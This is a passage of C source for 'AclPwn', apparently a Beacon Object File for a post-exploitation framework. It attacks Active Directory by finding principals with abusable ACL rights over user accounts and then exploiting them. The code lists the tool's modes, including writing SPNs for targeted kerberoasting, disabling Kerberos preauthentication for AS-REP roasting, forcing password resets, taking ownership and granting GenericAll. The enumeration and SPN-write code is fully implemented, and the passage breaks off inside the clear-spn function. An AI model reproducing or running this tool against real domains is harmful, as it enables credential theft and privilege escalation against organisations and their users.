#include <windows.h>
#include <winldap.h>
#include <winber.h>
#include <sddl.h>
#include <dsgetdc.h>
#include "beacon.h"
#include "bofdefs.h"

/*
 * AclPwn BOF - Phase 1: targeted-kerberoast primitives (enumeration + SPN write).
 * No ticket requests, no roasting - use nanorobeus/kerberoast for that.
 *
 * Modes:
 *   0 list-spn-writers      For each enabled user with no SPN, list every
 *                           principal in its DACL that can write SPN, plus
 *                           the owner. Domain-wide ACL inventory - not gated
 *                           on the current identity.
 *   1 set-spn               Write servicePrincipalName (refuses non-empty unless force)
 *   2 clear-spn             Delete servicePrincipalName
 *   3 list-preauth-writers  Same shape as list-spn-writers, but for
 *                           userAccountControl / DONT_REQ_PREAUTH: the
 *                           targeted AS-REP roast primitive.
 *   4 set-nopreauth         Flip userAccountControl DONT_REQ_PREAUTH (0x400000)
 *                           bit on for a target, enabling AS-REP roast.
 *   5 unset-nopreauth       Clear DONT_REQ_PREAUTH (cleanup after roasting).
 *   6 list-pwreset-writers  DACL inventory for User-Force-Change-Password
 *                           extended right (ControlAccess ACEs).
 *   7 reset-password        Reset unicodePwd on a target. Requires
 *                           GenericAll or Force-Change-Password. Password
 *                           supplied via --password, else generated.
 *   8 list-writeowner-writers  DACL inventory for WriteOwner (who can take
 *                           ownership of which user). Also flags GenericAll
 *                           (implies WriteOwner) and WriteDACL (indirect).
 *   9 take-ownership        Flip the target's OWNER SID to --principal
 *                           (defaults to current identity). Owner has
 *                           implicit WriteDACL.
 *  10 grant-genericall      Append an ACCESS_ALLOWED_ACE granting GenericAll
 *                           to --principal (defaults to self) on the target.
 *                           Requires WriteDACL (or implicit via ownership).
 *  11 pwn-writeowner        take-ownership then grant-genericall in one shot.
 *  12 restore-owner         Set OWNER SID back to --owner (cleanup helper).
 *
 * Alternate creds via --domain/--user/--pass (LDAP_AUTH_NEGOTIATE identity).
 */

/* Minimal ANSI SEC_WINNT_AUTH_IDENTITY_A for ldap_bind_s(LDAP_AUTH_NEGOTIATE). */
typedef struct {
    unsigned char* User;
    unsigned long  UserLength;
    unsigned char* Domain;
    unsigned long  DomainLength;
    unsigned char* Password;
    unsigned long  PasswordLength;
    unsigned long  Flags;
} APW_AUTH_IDENTITY_A;
#define APW_AUTH_IDENTITY_FLAG_ANSI 0x1

/* ---- modes ---- */
#define MODE_LIST_SPN_WRITERS      0
#define MODE_SET_SPN               1
#define MODE_CLEAR_SPN             2
#define MODE_LIST_PREAUTH_WRITERS  3
#define MODE_SET_NOPREAUTH         4
#define MODE_UNSET_NOPREAUTH       5
#define MODE_LIST_PWRESET_WRITERS  6
#define MODE_RESET_PASSWORD        7
#define MODE_LIST_WRITEOWNER_WRITERS 8
#define MODE_TAKE_OWNERSHIP        9
#define MODE_GRANT_GENERICALL     10
#define MODE_PWN_WRITEOWNER       11
#define MODE_RESTORE_OWNER        12

/* CollectAttrWriters match modes */
#define MATCH_WRITEPROP  0
#define MATCH_EXTRIGHT   1
#define MATCH_NONE       2  /* no attr/right GUID - only generic rights count */

/* ---- ACE right masks ---- */
#define ACE_GENERICALL      0x10000000
#define ACE_GENERICWRITE    0x40000000
#define ACE_WRITEDACL       0x00040000
#define ACE_WRITEOWNER      0x00080000
#define ACE_WRITEPROPERTY   0x00000020
#define ACE_CONTROL_ACCESS  0x00000100  /* ADS_RIGHT_DS_CONTROL_ACCESS */

/* our result bits (subset of masks that let us write the targeted attribute,
 * directly or indirectly). R_WRITEPROP_ATTR is set when a WriteProperty ACE's
 * object-type GUID matches whichever attribute the current op cares about. */
#define R_GENERICALL       0x001
#define R_GENERICWRITE     0x002
#define R_WRITEDACL        0x004
#define R_WRITEOWNER       0x008
#define R_WRITEPROP_ALL    0x010
#define R_WRITEPROP_ATTR   0x020
#define R_OWNER            0x040   /* implicit WriteDACL via ownership */
#define R_EXTRIGHT_ATTR    0x080   /* ControlAccess ACE keyed to a specific rightsGuid */
#define R_EXTRIGHT_ALL     0x100   /* unrestricted ControlAccess ACE */

/* userAccountControl DONT_REQ_PREAUTH bit (for AS-REP roast). */
#define UAC_DONT_REQ_PREAUTH  0x400000

#ifndef LDAP_SERVER_SD_FLAGS_OID
#define LDAP_SERVER_SD_FLAGS_OID "1.2.840.113556.1.4.801"
#endif

/* servicePrincipalName schemaIDGUID: f3a64788-5306-11d1-a9c5-0000f80367c1 */
static const unsigned char SPN_ATTR_GUID[16] = {
    0x88,0x47,0xa6,0xf3, 0x06,0x53, 0xd1,0x11,
    0xa9,0xc5, 0x00,0x00, 0xf8,0x03,0x67,0xc1
};

/* userAccountControl schemaIDGUID: bf967a68-0de6-11d0-a285-00aa003049e2 */
static const unsigned char UAC_ATTR_GUID[16] = {
    0x68,0x7a,0x96,0xbf, 0xe6,0x0d, 0xd0,0x11,
    0xa2,0x85, 0x00,0xaa, 0x00,0x30,0x49,0xe2
};

/* User-Force-Change-Password rightsGuid: 00299570-246d-11d0-a768-00aa006e0529 */
static const unsigned char FCPW_RIGHT_GUID[16] = {
    0x70,0x95,0x29,0x00, 0x6d,0x24, 0xd0,0x11,
    0xa7,0x68, 0x00,0xaa, 0x00,0x6e,0x05,0x29
};

/* ---- buffered output ---- */
#define OUTBUFSIZE 32768
static char* g_out    = (char*)1;
static int   g_outLen = 1;

static void bflush(void)
{
    if (g_out != NULL && g_out != (char*)1 && g_outLen > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_out, g_outLen);
    g_outLen = 0;
    if (g_out != NULL && g_out != (char*)1) g_out[0] = '\0';
}

static void bprintf(const char* fmt, ...)
{
    va_list ap;
    int n, space;

    if (g_out == NULL || g_out == (char*)1) return;

    space = OUTBUFSIZE - g_outLen;
    if (space <= 1) { bflush(); space = OUTBUFSIZE; }

    va_start(ap, fmt);
    n = MSVCRT$vsnprintf(g_out + g_outLen, (size_t)space, fmt, ap);
    va_end(ap);

    if (n < 0 || n >= space) {
        bflush();
        va_start(ap, fmt);
        n = MSVCRT$vsnprintf(g_out, OUTBUFSIZE, fmt, ap);
        va_end(ap);
        if (n < 0 || n >= OUTBUFSIZE) {
            g_outLen = OUTBUFSIZE - 1;
            g_out[g_outLen] = '\0';
            return;
        }
        g_outLen = n;
        return;
    }
    g_outLen += n;
}

/* ---- domain context ---- */
static char g_dc[256];
static char g_realm[256];
static char g_base[512];
static LDAP* g_ld = NULL;

static BOOL ResolveDomain(const char* domain)
{
    PDOMAIN_CONTROLLER_INFOA pdc = NULL;
    int i;

    g_dc[0]    = '\0';
    g_realm[0] = '\0';

    if (NETAPI32$DsGetDcNameA(NULL, domain, NULL, NULL, 0, &pdc) != ERROR_SUCCESS || !pdc)
        return FALSE;

    {
        const char* name = pdc->DomainControllerName;
        if (name && name[0] == '\\' && name[1] == '\\') name += 2;
        for (i = 0; name && name[i] && i < (int)sizeof(g_dc) - 1; i++) g_dc[i] = name[i];
        g_dc[i] = '\0';
    }
    {
        const char* dn = pdc->DomainName;
        for (i = 0; dn && dn[i] && i < (int)sizeof(g_realm) - 1; i++) {
            char c = dn[i];
            if (c >= 'a' && c <= 'z') c = c - 'a' + 'A';
            g_realm[i] = c;
        }
        g_realm[i] = '\0';
    }

    NETAPI32$NetApiBufferFree(pdc);
    return (g_dc[0] != '\0' && g_realm[0] != '\0');
}

static BOOL LdapConnect(const char* domain, const char* user, const char* pass)
{
    ULONG rc;
    int   v = LDAP_VERSION3;

    g_ld = WLDAP32$ldap_init(g_dc, 389);
    if (!g_ld) return FALSE;

    if (WLDAP32$ldap_set_option(g_ld, LDAP_OPT_PROTOCOL_VERSION, &v) != LDAP_SUCCESS)
        return FALSE;

    {
        PVOID on  = LDAP_OPT_ON;
        PVOID off = LDAP_OPT_OFF;
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_SIGN,      &on);
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_ENCRYPT,   &on);
        /* Don't chase referrals: cross-domain hops during a large sweep are
         * the most common crash trigger in this style of BOF. */
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_REFERRALS, &off);
    }

    if (user && user[0] && pass && pass[0]) {
        APW_AUTH_IDENTITY_A ident;
        const char* idDomain = (domain && domain[0]) ? domain : g_realm;

        ident.User           = (unsigned char*)user;
        ident.UserLength     = (unsigned long)MSVCRT$strlen(user);
        ident.Domain         = (unsigned char*)idDomain;
        ident.DomainLength   = (unsigned long)MSVCRT$strlen(idDomain);
        ident.Password       = (unsigned char*)pass;
        ident.PasswordLength = (unsigned long)MSVCRT$strlen(pass);
        ident.Flags          = APW_AUTH_IDENTITY_FLAG_ANSI;

        rc = WLDAP32$ldap_bind_s(g_ld, NULL, (PCHAR)&ident, LDAP_AUTH_NEGOTIATE);
    } else {
        rc = WLDAP32$ldap_bind_s(g_ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    }

    if (rc != LDAP_SUCCESS) {
        bprintf("[!] LDAP bind failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        return FALSE;
    }
    return TRUE;
}

static void LdapDisconnect(void)
{
    if (g_ld) { WLDAP32$ldap_unbind_s(g_ld); g_ld = NULL; }
}

static BOOL GetBaseDn(void)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR* vals      = NULL;
    PCHAR  attrs[]   = { "defaultNamingContext", NULL };
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, "", LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return FALSE;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        vals = WLDAP32$ldap_get_values(g_ld, e, "defaultNamingContext");
        if (vals && vals[0]) {
            int i = 0;
            for (; vals[0][i] && i < (int)sizeof(g_base) - 1; i++) g_base[i] = vals[0][i];
            g_base[i] = '\0';
        }
        if (vals) WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return g_base[0] != '\0';
}


/* Extract owner SID from a self-relative SD. Returns pointer inside sd, sets *sLen. */
static const unsigned char* GetOwnerSid(const unsigned char* sd, int sdLen, int* sLen)
{
    DWORD off;
    *sLen = 0;
    if (sdLen < 20) return NULL;
    off = (DWORD)sd[4] | ((DWORD)sd[5] << 8) | ((DWORD)sd[6] << 16) | ((DWORD)sd[7] << 24);
    if (off == 0 || off + 8 > (DWORD)sdLen) return NULL;
    if (sd[off] != 1) return NULL;
    int sub = sd[off + 1];
    if (sub > 15) return NULL;
    int L = 8 + 4 * sub;
    if (off + (DWORD)L > (DWORD)sdLen) return NULL;
    *sLen = L;
    return sd + off;
}

/* Escape reserved LDAP-filter characters in a value. */
static void LdapEscape(const char* in, char* out, int outSz)
{
    int i = 0, o = 0;
    while (in[i] && o < outSz - 4) {
        char c = in[i];
        switch (c) {
            case '*': o += MSVCRT$sprintf(out + o, "\\2a"); break;
            case '(': o += MSVCRT$sprintf(out + o, "\\28"); break;
            case ')': o += MSVCRT$sprintf(out + o, "\\29"); break;
            case '\\': o += MSVCRT$sprintf(out + o, "\\5c"); break;
            case '\0': break;
            default: out[o++] = c; break;
        }
        i++;
    }
    out[o] = '\0';
}

/* Resolve `target` (DN or sAMAccountName) to a DN. Caller frees via ldap_memfree. */
static PCHAR ResolveTargetDn(const char* target)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR attrs[]    = { "distinguishedName", NULL };
    PCHAR dn = NULL;
    ULONG rc;
    char filter[1024];

    /* If it contains '=' and starts with 'CN=' / 'OU=' / 'DC=' assume it's a DN. */
    if (MSVCRT$strchr(target, '=')) {
        rc = WLDAP32$ldap_search_s(g_ld, target, LDAP_SCOPE_BASE, "(objectClass=*)",
                                   attrs, 0, &res);
        if (rc == LDAP_SUCCESS && res) {
            e = WLDAP32$ldap_first_entry(g_ld, res);
            if (e) dn = WLDAP32$ldap_get_dn(g_ld, e);
            WLDAP32$ldap_msgfree(res);
            if (dn) return dn;
        }
    }

    /* Otherwise treat as sAMAccountName. */
    {
        char esc[512];
        LdapEscape(target, esc, sizeof(esc));
        MSVCRT$sprintf(filter, "(&(sAMAccountName=%s)(objectClass=user))", esc);
    }
    rc = WLDAP32$ldap_search_s(g_ld, g_base, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return NULL;
    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) dn = WLDAP32$ldap_get_dn(g_ld, e);
    WLDAP32$ldap_msgfree(res);
    return dn;
}

/* Print the human-readable list of rights encoded in `bits`. */
static void PrintRightsBits(DWORD bits, const char* specLabel, int matchMode)
{
    if (!bits) { bprintf("(none)"); return; }
    int first = 1;
    #define P(bit, name) do { if (bits & (bit)) { bprintf("%s%s", first ? "" : "|", name); first = 0; } } while (0)
    P(R_GENERICALL,    "GenericAll");
    P(R_GENERICWRITE,  "GenericWrite");
    if (matchMode == MATCH_WRITEPROP) {
        if (bits & R_WRITEPROP_ATTR) {
            bprintf("%sWriteProperty(%s)", first ? "" : "|", specLabel);
            first = 0;
        }
        P(R_WRITEPROP_ALL, "WriteProperty(*)");
    } else if (matchMode == MATCH_EXTRIGHT) {
        if (bits & R_EXTRIGHT_ATTR) {
            bprintf("%sExtendedRight(%s)", first ? "" : "|", specLabel);
            first = 0;
        }
        P(R_EXTRIGHT_ALL,  "ExtendedRight(*)");
    }
    /* MATCH_NONE: nothing to print for the specific rows. */
    P(R_WRITEDACL,     "WriteDACL");
    P(R_WRITEOWNER,    "WriteOwner");
    P(R_OWNER,         "Owner");
    #undef P
}

static void FormatSid(const unsigned char* sid, int len, char* out, int outSz)
{
    int   rev  = sid[0];
    int   nSub = sid[1];
    ULONG auth = ((ULONG)sid[4] << 24) | ((ULONG)sid[5] << 16) | ((ULONG)sid[6] << 8) | (ULONG)sid[7];
    int   pos  = 0;
    int   i;

    pos = MSVCRT$sprintf(out, "S-%d-%lu", rev, auth);
    for (i = 0; i < nSub; i++) {
        if (8 + i * 4 + 4 > len || pos >= outSz - 16) break;
        ULONG sub = (ULONG)sid[8 + i*4]
                  | ((ULONG)sid[8 + i*4 + 1] << 8)
                  | ((ULONG)sid[8 + i*4 + 2] << 16)
                  | ((ULONG)sid[8 + i*4 + 3] << 24);
        pos += MSVCRT$sprintf(out + pos, "-%lu", sub);
    }
}

static void LookupSidName(const unsigned char* sid, int sidLen, char* out, int outSz)
{
    char  name[256], domain[256];
    DWORD nameLen = sizeof(name), domainLen = sizeof(domain);
    SID_NAME_USE use;

    if (ADVAPI32$LookupAccountSidA(NULL, (PSID)(void*)sid, name, &nameLen, domain, &domainLen, &use)) {
        if (domain[0]) MSVCRT$sprintf(out, "%s\\%s", domain, name);
        else           MSVCRT$sprintf(out, "%s", name);
    } else {
        FormatSid(sid, sidLen, out, outSz);
    }
}

/* Default principals present in every user-object ACL (SYSTEM, Domain Admins,
 * Account/Server/Print/Backup Operators, BUILTIN\Administrators, CREATOR OWNER,
 * SELF, Enterprise DCs, Everyone). Skipped from output unless --noise. */
static BOOL IsBoringSid(const unsigned char* sid, int sidLen)
{
    if (sidLen < 8) return TRUE;
    int nSub = sid[1];
    if (nSub < 1 || nSub > 15) return TRUE;

    ULONG auth = ((ULONG)sid[6] << 8) | (ULONG)sid[7];
    ULONG s0   = (nSub >= 1) ? ((ULONG)sid[8]  | ((ULONG)sid[9]  << 8) | ((ULONG)sid[10] << 16) | ((ULONG)sid[11] << 24)) : 0;

    /* S-1-1-0 Everyone */
    if (auth == 1 && nSub == 1 && s0 == 0) return TRUE;
    /* S-1-3-0 CREATOR OWNER, S-1-3-1 CREATOR GROUP */
    if (auth == 3 && nSub == 1 && (s0 == 0 || s0 == 1)) return TRUE;

    if (auth == 5) {
        /* S-1-5-<n> single-sub well-knowns */
        if (nSub == 1) {
            if (s0 == 9 || s0 == 10 || s0 == 11 || s0 == 18 || s0 == 19 || s0 == 20)
                return TRUE;
        }
        /* S-1-5-32-<x> BUILTIN */
        if (nSub == 2 && s0 == 32) {
            ULONG s1 = (ULONG)sid[12] | ((ULONG)sid[13] << 8) | ((ULONG)sid[14] << 16) | ((ULONG)sid[15] << 24);
            if (s1 == 544 || s1 == 548 || s1 == 549 || s1 == 550 || s1 == 551 || s1 == 552)
                return TRUE;
        }
        /* Domain-scoped last RID: 500 (Admin), 512 (DA), 516 (DCs), 518 (Schema), 519 (EA), 520 (GPO CO) */
        if (nSub >= 5 && s0 == 21) {
            int off = 8 + (nSub - 1) * 4;
            if (off + 4 <= sidLen) {
                ULONG rid = (ULONG)sid[off] | ((ULONG)sid[off+1] << 8) | ((ULONG)sid[off+2] << 16) | ((ULONG)sid[off+3] << 24);
                if (rid == 500 || rid == 512 || rid == 516 || rid == 518 || rid == 519 || rid == 520)
                    return TRUE;
            }
        }
    }
    return FALSE;
}

/* ---- op: list SPN writers - who can write SPN on which no-SPN user ---- */
typedef struct {
    unsigned char sid[68];
    int           sidLen;
    DWORD         rights;
} spn_writer_t;

/* Walk a DACL, collect principals whose ACE grants a right allowing the
 * op's goal - either writing an attribute (MATCH_WRITEPROP, attrGuid points
 * at the schemaIDGUID) or invoking an extended right (MATCH_EXTRIGHT,
 * attrGuid points at the rightsGuid). GenericAll / WriteDACL / WriteOwner /
 * Owner apply to both modes; GenericWrite and WriteProperty apply only to
 * MATCH_WRITEPROP; ControlAccess applies only to MATCH_EXTRIGHT.
 * Returns nWriters. */
static int CollectAttrWriters(const unsigned char* sd, int sdLen,
                              const unsigned char* attrGuid, int matchMode,
                              BOOL noise,
                              spn_writer_t* writers, int maxW)
{
    int nWriters = 0;

    /* Owner (implicit WriteDACL). */
    int  ownLen = 0;
    const unsigned char* own = GetOwnerSid(sd, sdLen, &ownLen);
    if (own && ownLen > 0 && ownLen <= 68 && maxW > 0) {
        if (noise || !IsBoringSid(own, ownLen)) {
            MSVCRT$memcpy(writers[0].sid, own, ownLen);
            writers[0].sidLen = ownLen;
            writers[0].rights = R_OWNER;
            nWriters = 1;
        }
    }

    if (sdLen < 20) return nWriters;
    DWORD daclOff = (DWORD)sd[16] | ((DWORD)sd[17] << 8) | ((DWORD)sd[18] << 16) | ((DWORD)sd[19] << 24);
    if (!daclOff || daclOff + 8 > (DWORD)sdLen) return nWriters;

    WORD aceCount = (WORD)(sd[daclOff + 4] | (sd[daclOff + 5] << 8));
    const unsigned char* ace = sd + daclOff + 8;
    int a;

    for (a = 0; a < (int)aceCount; a++) {
        if ((int)(ace - sd) + 8 > sdLen) break;
        BYTE aceType = ace[0];
        WORD aceSize = (WORD)(ace[2] | (ace[3] << 8));
        if (aceSize < 8 || (int)(ace - sd) + aceSize > sdLen) break;
        DWORD mask = (DWORD)ace[4] | ((DWORD)ace[5] << 8) | ((DWORD)ace[6] << 16) | ((DWORD)ace[7] << 24);

        const unsigned char* sidPtr = NULL;
        const unsigned char* objGuid = NULL;
        if (aceType == 0) {
            sidPtr = ace + 8;
        } else if (aceType == 5 && aceSize >= 12) {
            DWORD objFlags = (DWORD)ace[8] | ((DWORD)ace[9] << 8) |
                             ((DWORD)ace[10] << 16) | ((DWORD)ace[11] << 24);
            int sidOff = 12;
            if (objFlags & 0x1) { objGuid = ace + 12; sidOff += 16; }
            if (objFlags & 0x2) sidOff += 16;
            sidPtr = ace + sidOff;
        } else { ace += aceSize; continue; }

        if (!sidPtr) { ace += aceSize; continue; }
        int sidOff = (int)(sidPtr - ace);
        if (sidOff < 8 || sidOff + 8 > (int)aceSize) { ace += aceSize; continue; }
        int subCount = sidPtr[1];
        if (sidPtr[0] != 1 || subCount > 15) { ace += aceSize; continue; }
        int sidLen2 = 8 + 4 * subCount;
        if (sidOff + sidLen2 > (int)aceSize) { ace += aceSize; continue; }

        DWORD r = 0;
        if (mask & ACE_GENERICALL)    r |= R_GENERICALL;
        if (mask & ACE_WRITEDACL)     r |= R_WRITEDACL;
        if (mask & ACE_WRITEOWNER)    r |= R_WRITEOWNER;

        if (matchMode == MATCH_WRITEPROP) {
            if (mask & ACE_GENERICWRITE) r |= R_GENERICWRITE;
            if (mask & ACE_WRITEPROPERTY) {
                if (!objGuid) r |= R_WRITEPROP_ALL;
                else {
                    int j; BOOL m = TRUE;
                    for (j = 0; j < 16; j++)
                        if (objGuid[j] != attrGuid[j]) { m = FALSE; break; }
                    if (m) r |= R_WRITEPROP_ATTR;
                }
            }
        } else if (matchMode == MATCH_EXTRIGHT) {
            /* Extended right; GenericWrite does NOT grant these. */
            if (mask & ACE_CONTROL_ACCESS) {
                if (!objGuid) r |= R_EXTRIGHT_ALL;
                else {
                    int j; BOOL m = TRUE;
                    for (j = 0; j < 16; j++)
                        if (objGuid[j] != attrGuid[j]) { m = FALSE; break; }
                    if (m) r |= R_EXTRIGHT_ATTR;
                }
            }
        }
        /* MATCH_NONE: no attribute / no extended right; only generic bits
         * (GenericAll / WriteDACL / WriteOwner / Owner) are relevant. */
        if (r == 0) { ace += aceSize; continue; }
        if (!noise && IsBoringSid(sidPtr, sidLen2)) { ace += aceSize; continue; }
        if (sidLen2 > 68) { ace += aceSize; continue; }

        int k, found = -1;
        for (k = 0; k < nWriters; k++) {
            if (writers[k].sidLen == sidLen2) {
                int j; BOOL eq = TRUE;
                for (j = 0; j < sidLen2; j++)
                    if (writers[k].sid[j] != sidPtr[j]) { eq = FALSE; break; }
                if (eq) { found = k; break; }
            }
        }
        if (found >= 0) {
            writers[found].rights |= r;
        } else if (nWriters < maxW) {
            MSVCRT$memcpy(writers[nWriters].sid, sidPtr, sidLen2);
            writers[nWriters].sidLen = sidLen2;
            writers[nWriters].rights = r;
            nWriters++;
        }
        ace += aceSize;
    }
    return nWriters;
}

/* Shared: for each enabled user matching `filter`, print every principal in
 * its DACL that can write `attrLabel` (the attribute pinpointed by attrGuid),
 * plus the owner. Legend + summary framed around the caller's context. */
static void PrintLegend(const char* specLabel, int matchMode, const char* goalLabel)
{
    bprintf("--- ACE legend (any one is enough to %s) ---\n", goalLabel);
    bprintf("  GenericAll                    full control - one step.\n");
    if (matchMode == MATCH_WRITEPROP) {
        bprintf("  GenericWrite                  write any attribute except the ACL - one step.\n");
        bprintf("  WriteProperty(%-14s) write that attribute specifically - one step.\n", specLabel);
        bprintf("  WriteProperty(*)              write any attribute (no attr restriction) - one step.\n");
    } else if (matchMode == MATCH_EXTRIGHT) {
        bprintf("  ExtendedRight(%-14s) invoke that extended right specifically - one step.\n", specLabel);
        bprintf("  ExtendedRight(*)              invoke any extended right - one step.\n");
        bprintf("  (GenericWrite does NOT grant extended rights.)\n");
    } else {
        /* MATCH_NONE: the goal itself (e.g., take-ownership) is granted by
         * generic bits alone. */
        bprintf("  WriteOwner                    directly grants %s.\n", goalLabel);
        bprintf("  (GenericWrite does NOT grant this.)\n");
    }
    bprintf("  WriteDACL                     modify the DACL. Grant self GenericAll, then act.\n");
    bprintf("  WriteOwner                    become owner (implicit WriteDACL). Take ownership,\n");
    bprintf("                                grant self GenericAll, then act.\n");
    bprintf("  Owner                         already the owner - implicit WriteDACL.\n");
    bprintf("-------------------------------------------------------------------------------\n\n");
}

static void RunAttrWritersOp(const char* headerFilterDesc,
                             const char* countLabel,
                             const char* ldapFilter,
                             const unsigned char* attrGuid,
                             const char* specLabel,
                             const char* goalLabel,
                             int matchMode,
                             BOOL noise)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR attrs[]    = { "sAMAccountName", "nTSecurityDescriptor", NULL };
    ULONG rc;
    int   total = 0, hits = 0;

    unsigned char sdflags[5] = { 0x30, 0x03, 0x02, 0x01, 0x07 };
    struct berval ctlval = { sizeof(sdflags), (char*)sdflags };
    LDAPControl  ctl     = { LDAP_SERVER_SD_FLAGS_OID, ctlval, TRUE };
    PLDAPControl sctrls[] = { &ctl, NULL };

    bprintf("[?] Base DN : %s\n", g_base);
    bprintf("[?] Filter  : %s\n", headerFilterDesc);
    bprintf("[?] Noise   : %s\n\n", noise ? "showing default principals" : "default principals suppressed (--noise to include)");
    PrintLegend(specLabel, matchMode, goalLabel);

    rc = WLDAP32$ldap_search_ext_s(g_ld, g_base, LDAP_SCOPE_SUBTREE, ldapFilter,
                                   attrs, 0, sctrls, NULL, NULL, 0, &res);
    if (rc != LDAP_SUCCESS || !res) {
        bprintf("[!] LDAP search failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        if (res) WLDAP32$ldap_msgfree(res);
        return;
    }

    for (e = WLDAP32$ldap_first_entry(g_ld, res); e; e = WLDAP32$ldap_next_entry(g_ld, e)) {
        total++;

        struct berval** sdv = WLDAP32$ldap_get_values_len(g_ld, e, "nTSecurityDescriptor");
        if (!sdv || !sdv[0] || sdv[0]->bv_len < 20) {
            if (sdv) WLDAP32$ldap_value_free_len(sdv);
            continue;
        }
        const unsigned char* sd = (const unsigned char*)sdv[0]->bv_val;
        int sdLen = (int)sdv[0]->bv_len;

        spn_writer_t writers[64];
        int nWriters = CollectAttrWriters(sd, sdLen, attrGuid, matchMode, noise, writers, 64);

        if (nWriters > 0) {
            PCHAR* sams = WLDAP32$ldap_get_values(g_ld, e, "sAMAccountName");
            PCHAR  dn   = WLDAP32$ldap_get_dn(g_ld, e);

            bprintf("[+] %s\n", sams && sams[0] ? sams[0] : "(?)");
            bprintf("    DN : %s\n", dn ? dn : "(?)");
            int k;
            for (k = 0; k < nWriters; k++) {
                char nameBuf[512];
                LookupSidName(writers[k].sid, writers[k].sidLen, nameBuf, sizeof(nameBuf));
                bprintf("      %-40s : ", nameBuf);
                PrintRightsBits(writers[k].rights, specLabel, matchMode);
                bprintf("\n");
            }
            bprintf("\n");

            if (sams) WLDAP32$ldap_value_free(sams);
            if (dn)   WLDAP32$ldap_memfree(dn);
            hits++;
        }

        WLDAP32$ldap_value_free_len(sdv);
    }

    WLDAP32$ldap_msgfree(res);
    bprintf("[*] Scanned %d %s user(s); %d with interesting ACL edges.\n", total, countLabel, hits);
}

static void OpListSpnWriters(BOOL noise)
{
    RunAttrWritersOp(
        "enabled users, servicePrincipalName absent",
        "no-SPN",
        "(&(sAMAccountType=805306368)"
        "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
        "(!(servicePrincipalName=*)))",
        SPN_ATTR_GUID,
        "servicePrincipalName",
        "reach a servicePrincipalName write",
        MATCH_WRITEPROP,
        noise);
}

static void OpListPreauthWriters(BOOL noise)
{
    RunAttrWritersOp(
        "enabled users, DONT_REQ_PREAUTH not already set",
        "preauth-required",
        "(&(sAMAccountType=805306368)"
        "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
        "(!(userAccountControl:1.2.840.113556.1.4.803:=4194304)))",
        UAC_ATTR_GUID,
        "userAccountControl",
        "flip DONT_REQ_PREAUTH",
        MATCH_WRITEPROP,
        noise);
}

static void OpListPwresetWriters(BOOL noise)
{
    /* All enabled users - pwreset applies to every account. */
    RunAttrWritersOp(
        "enabled users",
        "enabled",
        "(&(sAMAccountType=805306368)"
        "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        FCPW_RIGHT_GUID,
        "Force-Change-Password",
        "reset the user's password",
        MATCH_EXTRIGHT,
        noise);
}

static void OpListWriteOwnerWriters(BOOL noise)
{
    /* All enabled users - WriteOwner is universally exploitable on any object. */
    RunAttrWritersOp(
        "enabled users",
        "enabled",
        "(&(sAMAccountType=805306368)"
        "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        NULL,
        "",
        "take ownership of the target",
        MATCH_NONE,
        noise);
}


/* Read current SPN value count (0 = empty). Fast path without printing. */
static int CountSpnValues(const char* dn)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR attrs[]    = { "servicePrincipalName", NULL };
    int   n = 0;

    if (WLDAP32$ldap_search_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res) != LDAP_SUCCESS || !res)
        return -1;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        PCHAR* vals = WLDAP32$ldap_get_values(g_ld, e, "servicePrincipalName");
        if (vals) { while (vals[n]) n++; WLDAP32$ldap_value_free(vals); }
    }
    WLDAP32$ldap_msgfree(res);
    return n;
}

/* ---- op: set servicePrincipalName ---- */
static void OpSetSpn(const char* target, const char* spn, BOOL force)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }

    bprintf("[?] Target : %s\n", dn);
    bprintf("[?] SPN    : %s\n", spn);

    int existing = CountSpnValues(dn);
    if (existing < 0) {
        bprintf("[!] Failed to read current servicePrincipalName\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }
    if (existing > 0 && !force) {
        bprintf("[-] Target already has %d SPN(s). Refusing to overwrite.\n", existing);
        bprintf("[-] Re-run with --force to REPLACE the attribute (destructive).\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    char* vals[2] = { (char*)spn, NULL };
    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op   = LDAP_MOD_REPLACE;
    mod.mod_type = "servicePrincipalName";
    mod.mod_vals.modv_strvals = vals;
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] servicePrincipalName set to '%s' on %s\n", spn, dn);
        bprintf("[*] Kerberoast now with: nanorobeus / kerberoast BOF against '%s'\n", spn);
        bprintf("[*] Remember to run 'aclpwn clear-spn --target <t>' afterwards.\n");
    } else {
        bprintf("[!] ldap_modify_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }

    WLDAP32$ldap_memfree(dn);
}

/* ---- op: clear servicePrincipalName ---- */
static void OpClearSpn(const char* target)
{
    PCHAR dn = ResolveTargetDn(target);
